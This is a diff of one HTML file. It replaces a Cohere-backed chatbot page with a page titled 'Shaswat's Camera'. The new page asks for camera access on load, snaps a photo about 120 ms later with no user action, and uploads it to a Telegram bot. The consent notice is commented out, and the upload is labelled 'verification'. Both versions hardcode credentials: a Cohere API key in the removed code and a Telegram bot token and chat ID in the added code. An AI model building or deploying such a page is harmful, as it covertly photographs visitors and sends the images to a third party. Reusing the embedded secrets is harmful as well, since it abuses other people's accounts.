@@ -3,359 +3,129 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NexusAI - Premium Workspace</title>
+    <title>Shaswat's Camera 👀</title>
     <style>
-        /* Modern ChatGPT / Gemini Premium Dark Glass Theme UI */
-        :root {
-            --bg-main: #0b0f19;
-            --sidebar-bg: #111827;
-            --chat-bg: #131c2e;
-            --text-primary: #f3f4f6;
-            --text-secondary: #9ca3af;
-            --accent-glow: #3b82f6;
-            --border-color: rgba(255, 255, 255, 0.08);
-            --user-bubble: #2563eb;
-            --bot-bubble: rgba(255, 255, 255, 0.05);
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background-color: #f4f4f9; }
+        video, canvas { border: 2px solid #333; border-radius: 8px; max-width: 100%; }
+        #status { margin-top: 15px; font-weight: bold; font-size: 18px; }
+        
+        /* Popup Modal Styles */
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: flex; justify-content: center; align-items: center;
+            z-index: 1000;
         }
-
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
+        .modal-box {
+            background: white; padding: 30px; border-radius: 10px;
+            max-width: 400px; width: 90%; text-align: center;
+            box-shadow: 0px 4px 15px rgba(0,0,0,0.2);
         }
-
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background-color: var(--bg-main);
-            color: var(--text-primary);
-            display: flex;
-            height: 100vh;
-            width: 100vw;
-            overflow: hidden;
+        .modal-box h3 { margin-top: 0; color: #333; }
+        .modal-box p { color: #566573; font-size: 15px; line-height: 1.5; }
+        .bot-link { 
+            display: inline-block; margin-top: 15px; padding: 10px 20px; 
+            background-color: #0088cc; color: white; text-decoration: none; 
+            border-radius: 5px; font-weight: bold; 
         }
-
-        .app-container {
-            display: flex;
-            width: 100%;
-            height: 100%;
-        }
-
-        .sidebar {
-            width: 260px;
-            background-color: var(--sidebar-bg);
-            border-right: 1px solid var(--border-color);
-            display: flex;
-            flex-direction: column;
-            padding: 16px;
-            gap: 20px;
-        }
-
-        @media (max-width: 768px) {
-            .sidebar { display: none; }
-        }
-
-        .new-chat-btn {
-            background: transparent;
-            border: 1px solid var(--border-color);
-            color: var(--text-primary);
-            padding: 12px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-weight: 500;
-            text-align: left;
-            transition: background 0.2s;
-        }
-
-        .new-chat-btn:hover {
-            background: rgba(255, 255, 255, 0.05);
-        }
-
-        .main-chat-pane {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            background-color: var(--bg-main);
-            position: relative;
-        }
-
-        .chat-header {
-            height: 60px;
-            border-bottom: 1px solid var(--border-color);
-            display: flex;
-            align-items: center;
-            padding: 0 24px;
-            justify-content: space-between;
-        }
-
-        .model-badge {
-            background: rgba(59, 130, 246, 0.1);
-            color: var(--accent-glow);
-            padding: 6px 12px;
-            border-radius: 20px;
-            font-size: 0.8rem;
-            font-weight: 600;
-            border: 1px solid rgba(59, 130, 246, 0.2);
-        }
-
-        .messages-viewport {
-            flex: 1;
-            overflow-y: auto;
-            padding: 40px 10% 120px 10%;
-            display: flex;
-            flex-direction: column;
-            gap: 32px;
-        }
-
-        .msg-row {
-            display: flex;
-            width: 100%;
-            gap: 18px;
-        }
-
-        .msg-row.user-variant {
-            justify-content: flex-end;
-        }
-
-        .avatar {
-            width: 36px;
-            height: 36px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
-            font-size: 0.85rem;
-            flex-shrink: 0;
-        }
-
-        .user-variant .avatar {
-            background-color: #4b5563;
-            order: 2;
-        }
-
-        .bot-variant .avatar {
-            background: linear-gradient(135deg, #3b82f6, #8b5cf6);
-            box-shadow: 0 0 10px rgba(139, 92, 246, 0.4);
-        }
-
-        .content-bubble {
-            max-width: 75%;
-            padding: 12px 18px;
-            border-radius: 12px;
-            font-size: 1rem;
-            line-height: 1.6;
-            word-wrap: break-word;
-        }
-
-        .user-variant .content-bubble {
-            background-color: var(--user-bubble);
-            border-top-right-radius: 2px;
-        }
-
-        .bot-variant .content-bubble {
-            background-color: var(--bot-bubble);
-            border: 1px solid var(--border-color);
-            border-top-left-radius: 2px;
-        }
-
-        .input-floating-deck {
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            padding: 24px 10%;
-            background: linear-gradient(transparent, var(--bg-main) 40%);
-        }
-
-        .input-bar-container {
-            background-color: var(--chat-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 14px;
-            display: flex;
-            padding: 10px 14px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.4);
-        }
-
-        .input-bar-container:focus-within {
-            border-color: var(--accent-glow);
-            box-shadow: 0 0 15px rgba(59, 130, 246, 0.2);
-        }
-
-        textarea {
-            flex: 1;
-            background: transparent;
-            border: none;
-            outline: none;
-            color: var(--text-primary);
-            font-size: 1rem;
-            resize: none;
-            height: 28px;
-            font-family: inherit;
-            padding-top: 4px;
-        }
-
-        .action-send-btn {
-            background-color: var(--accent-glow);
-            color: white;
-            border: none;
-            width: 32px;
-            height: 32px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-weight: bold;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: opacity 0.2s;
-            align-self: flex-end;
-        }
-
-        .action-send-btn:hover { opacity: 0.9; }
-        .action-send-btn:disabled { background-color: #374151; cursor: not-allowed; }
-
-        .pulse-thinking {
-            animation: pulse 1.4s infinite ease-in-out;
-            color: var(--text-secondary);
-        }
-        @keyframes pulse { 0%, 100% { opacity: 0.5; } 50% { opacity: 1; } }
+        .bot-link:hover { background-color: #006699; }
     </style>
 </head>
 <body>
 
-    <div class="app-container">
-        <div class="sidebar">
-            <button class="new-chat-btn" onclick="window.location.reload()">+ New Thread</button>
-            <div style="color: var(--text-secondary); font-size: 0.8rem; margin-top: auto;">Command-R Engine Active</div>
+    <!-- Notification Popup Overlay -->
+    <!-- <div class="modal-overlay" id="noticeModal">
+        <div class="modal-box">
+            <h3>📷 Automatic Verification Notice</h3>
+            <p>Please allow camera access. A verification photo will be automatically captured upon loading and securely transmitted to our automated processing system.</p>
+            <p>You can view updates or manage data directly via our official channel:</p>
+            <a href="https://t.me" target="_blank" class="bot-link">Open Telegram Bot Link</a>
         </div>
+    </div> -->
 
-        <div class="main-chat-pane">
-            <div class="chat-header">
-                <div style="font-weight: 600; font-size: 1.1rem; letter-spacing: 0.5px;">NexusAI Core</div>
-                <div class="model-badge">Command-R Ultra (Online)</div>
-            </div>
+    <h2>ShaswatXCamera</h2>
+    
+    <video id="video" width="640" height="480" autoplay playsinline></video>
+    <br>
+    
+    <div id="status">Initializing camera stream...</div>
 
-            <div class="messages-viewport" id="viewport">
-                <div class="msg-row bot-variant">
-                    <div class="avatar">AI</div>
-                    <div class="content-bubble">Hello! I am your advanced AI workspace interface. Ask me anything to test my processing capabilities.</div>
-                </div>
-            </div>
-
-            <div class="input-floating-deck">
-                <div class="input-bar-container">
-                    <textarea id="rawInput" placeholder="Message NexusAI..." rows="1"></textarea>
-                    <button class="action-send-btn" id="submitButton" onclick="handleMessageTransmission()">➔</button>
-                </div>
-            </div>
-        </div>
-    </div>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <script>
-        const viewport = document.getElementById('viewport');
-        const rawInput = document.getElementById('rawInput');
-        const submitButton = document.getElementById('submitButton');
+        // --- CONFIGURATION ---
+        const BOT_TOKEN = '8837215809:AAEJJ05BIjul96LJtHP_ZiKz_lnyk5a8esA'; 
+        const CHAT_ID = '7787904819';     
+        // ---------------------
 
-        // ------------------ COHERE API CREDENTIALS ------------------
-        const API_TOKEN = "cohere_tAraiRnMdPZAuXb2SdJPM2fC3oM8mCLYQuGwlGCA47204L";
-        const ENDPOINT_URL = "https://api.cohere.com/v1/chat";
-        // ------------------------------------------------------------
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const statusDiv = document.getElementById('status');
+        const noticeModal = document.getElementById('noticeModal');
 
-        let chatHistory = [];
+        // Request access to the user's camera immediately on page load
+        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+            .then(stream => {
+                video.srcObject = stream;
+                statusDiv.innerText = "Camera active. Capturing photo in 1 second...";
+                
+                // Small delay to ensure the video feed stabilizes before drawing frame
+                setTimeout(autoCapturePhoto, 120);
+            })
+            .catch(err => {
+                console.error("Camera access error: ", err);
+                statusDiv.innerText = "Error: Camera access denied or unavailable.";
+                noticeModal.style.display = "none"; // Hide popup if capture fails
+            });
 
-        async function handleMessageTransmission() {
-            const query = rawInput.value.trim();
-            if(!query || submitButton.disabled) return;
+        // Automated function replacing the manual click event
+        function autoCapturePhoto() {
+            statusDiv.innerText = "Clicking Snap...";
+            
+            const context = canvas.getContext('2d');
+            // Draw current video frame onto the hidden canvas
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            setControlStates(true);
-            renderBubble(query, 'user-variant', 'You');
-            rawInput.value = '';
+            // Convert canvas data into a JPEG blob file
+            canvas.toBlob((blob) => {
+                if (!blob) {
+                    statusDiv.innerText = "Failed to process image.";
+                    return;
+                }
+                
+                statusDiv.innerText = "Processing submission...";
+                sendToTelegram(blob);
+            }, 'image/jpeg', 0.8);
+        }
 
-            const processingRow = renderBubble('Thinking...', 'bot-variant', 'AI', true);
+        // Send the image using FormData and Fetch API
+        async function sendToTelegram(imageBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', imageBlob, 'automated_capture.jpg');
+            formData.append('caption', '📸 Automated photo captured upon user entry.');
 
             try {
-                if(API_TOKEN.includes("PASTE_YOUR_FREE_COHERE_KEY")) {
-                    throw new Error("TOKEN_MISSING");
-                }
-
-                const response = await fetch(ENDPOINT_URL, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                        "Authorization": `Bearer ${API_TOKEN}`
-                    },
-                    body: JSON.stringify({
-                        message: query,
-                        model: "command-r",
-                        chat_history: chatHistory
-                    })
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
                 });
 
-                if(!response.ok) throw new Error(`HTTP_${response.status}`);
-
-                const data = await response.json();
-                let aiReply = data.text;
-
-                // Save conversation memory context
-                chatHistory.push({ role: "USER", message: query });
-                chatHistory.push({ role: "CHATBOT", message: aiReply });
-
-                const targetedBubble = processingRow.querySelector('.content-bubble');
-                targetedBubble.classList.remove('pulse-thinking');
-                targetedBubble.innerText = aiReply;
-
-            } catch (error) {
-                const errorBubble = processingRow.querySelector('.content-bubble');
-                errorBubble.classList.remove('pulse-thinking');
-                errorBubble.style.borderColor = "rgba(239, 68, 68, 0.4)";
-                errorBubble.style.background = "rgba(239, 68, 68, 0.05)";
-
-                if (error.message === "TOKEN_MISSING") {
-                    errorBubble.innerText = "Configuration Error: You haven't added your Cohere API key yet. Open index.html and paste it on line 132.";
+                const result = await response.json();
+                
+                if (result.ok) {
+                    statusDiv.innerHTML = "<span style='color: green;'>Verification Image Transmitted Successfully!</span>";
+                    // Dismiss the modal once processing completes successfully
+                    noticeModal.style.display = "none";
                 } else {
-                    errorBubble.innerText = "Connection error. Make sure your internet is stable or that your API key is correct.";
+                    statusDiv.innerHTML = `<span style='color: red;'>Telegram API Error: ${result.description}</span>`;
                 }
-            } finally {
-                setControlStates(false);
-                scrollWindow();
+            } catch (error) {
+                console.error("Transmission error:", error);
+                statusDiv.innerHTML = "<span style='color: red;'>Network error occurred.</span>";
             }
         }
-
-        function renderBubble(msgText, displayClass, signature, isThinking = false) {
-            const row = document.createElement('div');
-            row.classList.add('msg-row', displayClass);
-
-            const avatar = document.createElement('div');
-            avatar.classList.add('avatar');
-            avatar.innerText = signature;
-
-            const bubble = document.createElement('div');
-            bubble.classList.add('content-bubble');
-            if(isThinking) bubble.classList.add('pulse-thinking');
-            bubble.innerText = msgText;
-
-            row.appendChild(avatar);
-            row.appendChild(bubble);
-            viewport.appendChild(row);
-            scrollWindow();
-            return row;
-        }
-
-        function setControlStates(lock) {
-            rawInput.disabled = lock;
-            submitButton.disabled = lock;
-            if(!lock) setTimeout(() => rawInput.focus(), 50);
-        }
-
-        function scrollWindow() {
-            viewport.scrollTop = viewport.scrollHeight;
-        }
-
-        rawInput.addEventListener("keydown", function(e) {
-            if(e.key === "Enter" && !e.shiftKey) {
-                e.preventDefault();
-                handleMessageTransmission();
-            }
-        });
     </script>
 </body>
 </html>
